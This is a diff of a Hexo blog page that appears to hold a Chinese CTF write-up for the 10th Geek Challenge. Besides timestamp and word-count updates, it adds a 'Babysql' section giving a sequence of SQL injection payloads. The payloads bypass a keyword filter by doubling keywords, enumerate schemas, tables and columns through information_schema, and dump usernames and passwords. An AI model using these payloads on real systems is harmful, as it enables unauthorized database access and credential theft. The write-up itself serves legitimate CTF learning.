@@ -139,7 +139,7 @@
 <meta property="og:image" content="https://asscreed.github.io/2019/10/18/第十届极客大挑战Write-up/image-20191030233348553.png">
 <meta property="og:image" content="https://asscreed.github.io/2019/10/18/第十届极客大挑战Write-up/image-20191030233555540.png">
 <meta property="og:image" content="https://asscreed.github.io/2019/10/18/第十届极客大挑战Write-up/image-20191030233648512.png">
-<meta property="og:updated_time" content="2019-11-11T02:27:37.313Z">
+<meta property="og:updated_time" content="2019-11-11T04:25:57.832Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第十届极客大挑战Write-up">
 <meta name="twitter:description" content="题目很有意思.比赛地址:http://geek.sycsec.com:44444/challenge/index">
@@ -444,7 +444,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-11-11 10:27:37" itemprop="dateModified" datetime="2019-11-11T10:27:37+08:00">2019-11-11</time>
+                <time title="修改时间：2019-11-11 12:25:57" itemprop="dateModified" datetime="2019-11-11T12:25:57+08:00">2019-11-11</time>
               </span>
             
           
@@ -493,7 +493,7 @@
               
                 <span class="post-meta-item-text">本文字数：</span>
               
-              <span>9k</span>
+              <span>9.6k</span>
             </span>
           
             <span class="post-meta-item" title="阅读时长">
@@ -503,7 +503,7 @@
               
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
               
-              <span>8 分钟</span>
+              <span>9 分钟</span>
             </span>
           
             <div class="post-description">题目很有意思.比赛地址:http://geek.sycsec.com:44444/challenge/index</div>
@@ -695,7 +695,9 @@
 <p>利用PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">伪协议</a>和base64加密读取文件内容</p>
 <p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191031124114147.png" alt="image-20191031124114147"></p>
 <p>base64解码得到flag</p>
-<h2 id="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"><a href="#Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！" class="headerlink" title="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"></a>Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！</h2><p>ununionion selselectect 1,2,group_concat(passwoorrd) frofromm b4bsql– &amp;password=1</p>
+<h2 id="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"><a href="#Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！" class="headerlink" title="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"></a>Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！</h2><p>经过测试一些关键字被过滤了，但通过双写可以绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //判断字段</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //查数据库</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //查表</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //查字段</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //获取数据</span><br></pre></td></tr></table></figure>
+
 <h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p><img src="/2019/10/18/第十届极客大挑战Write-up/image-20191029215131113.png" alt="image-20191029215131113"></p>
 <p>查看源码，发现Secret.php</p>
 <p>打开Secret.php</p>
@@ -1054,14 +1056,14 @@
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">22k</span>
+    <span title="站点总字数">23k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">20 分钟</span>
+    <span title="站点阅读时长">21 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
   <span class="post-meta-divider">|</span>
